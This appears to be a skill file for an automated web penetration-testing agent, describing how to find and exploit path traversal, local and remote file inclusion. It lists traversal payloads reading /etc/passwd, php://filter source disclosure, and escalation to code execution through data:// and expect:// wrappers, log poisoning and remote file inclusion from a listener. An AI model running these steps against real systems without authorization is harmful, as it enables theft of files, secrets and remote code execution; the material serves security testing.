---
name: web-path-traversal-lfi
description: >
  Detect and exploit path traversal / local file inclusion (and RFI). USE WHEN a
  parameter names a file or path (?file=, ?page=, ?template=, download/export
  endpoints, Content-Disposition filenames). Covers classic ../, single/double/
  overlong encoding, absolute paths, php://filter/data:///expect:// wrappers,
  LFI->log-poisoning RCE, /proc/self/environ, zip-slip, and route-normalization
  traversal.
tags: [web, path-traversal, lfi, rfi, file-read, owasp-a01, injection]
tools: [ffuf, curl, httpx]
payloads:
  - {kind: glob, path: "vendor/PayloadsAllTheThings/Directory Traversal/*.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: glob, path: "vendor/PayloadsAllTheThings/File Inclusion/*.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: upstream_doc, path: "vendor/hacktricks/pentesting-web/file-inclusion/README.md", license: CC-BY-SA-4.0, credit: "HackTricks - Carlos Polop"}
verification:
  kind: signature
  signals: ["root:x:0:0:", "daemon:x:", "for 16-bit app support", "[fonts]"]
references:
  - "https://portswigger.net/web-security/file-path-traversal"
  - "https://portswigger.net/web-security/file-path-traversal/lab-simple"
license: AGPL-3.0-or-later
version: 1.0.0
---
# Path traversal / LFI — read a file you shouldn’t

The proof is **known-file content in the response** (`/etc/passwd`’s
`root:x:0:0:`, Windows `win.ini`’s `[fonts]`) or, for RFI/wrappers, a callback to
your listener. A `500` on `../` is a hint, not a finding.

## Preconditions / triggers
- A param that references a file/path: `?file=`, `?page=`, `?template=`,
  `?lang=`, download/export routes, upload/`Content-Disposition` filenames.

## Methodology
1. **Find file params.** Capture flows; flag any value that looks like a filename
   or path, or that changes the response when you point it at a different file.
2. **Traversal fuzz.** `fuzz` a wordlist mixing raw and encoded forms —
   `../../../../etc/passwd`, `%2e%2e%2f`, double `%252e%252f`, overlong
   `..%c0%af`, leading-slash absolute `/etc/passwd`, and depth-tuned `../` counts.
   Anomaly-rank by status/length; the hit is the one returning file content.
3. **Confirm.** `req search 'root:x:0:0'` (or `[fonts]`) across flows pinpoints
   the leaking response.
4. **Escalate — source disclosure.** `php://filter/convert.base64-encode/resource=
   index.php` returns the source base64; `decode base64` it, then mine it
   (secrets, hidden routes) exactly like `recon-js-supplychain` does for JS.
5. **Escalate — RCE.** `data://`/`expect://` wrappers, or LFI + log-poisoning
   (inject PHP into a log via `User-Agent`, then include the log), or
   `/proc/self/environ`.
6. **RFI.** If `allow_url_include`, include `http://<listener>/<cid>.php` — the
   fetch lands on your in-sandbox listener (`req list --protocol http`).
7. **Zip-slip / route traversal.** Traversal in archive extraction or in the URL
   path itself (`;`, `%2f`, normalization discrepancy front-end vs origin).

## Confirmation oracle (0-FP)
`verify.py` uses the **signature** oracle: known-file markers must appear in the
target flow’s response. For RFI/wrapper callbacks it falls back to the **OOB**
oracle (`collab` + `correlation_id`). A traversal attempt that only errors or
returns an empty body is rejected.

## Cross-chain
- LFI → source → secrets/keys → `web-jwt-auth`; LFI → RCE via wrappers/log
  poisoning; traversal of a config file → creds → auth.

## burpwn recipes
- `fuzz run --flow <id> --position <file-value> --payloads traversal.txt` —
  encoded-traversal sweep, anomaly-ranked.
- `decode base64 <php-filter-output>` — unwrap disclosed source.
- `req search 'root:x:0:0'` — confirm file-content leakage.

## False-positive traps
- A blanket `404`/`403` for every payload means the param isn’t a file sink.
- Reflected input that is not actual file content (`../` echoed) ≠ read.
- A WAF returning `/etc/passwd`-shaped bait — verify the full, real file shape.
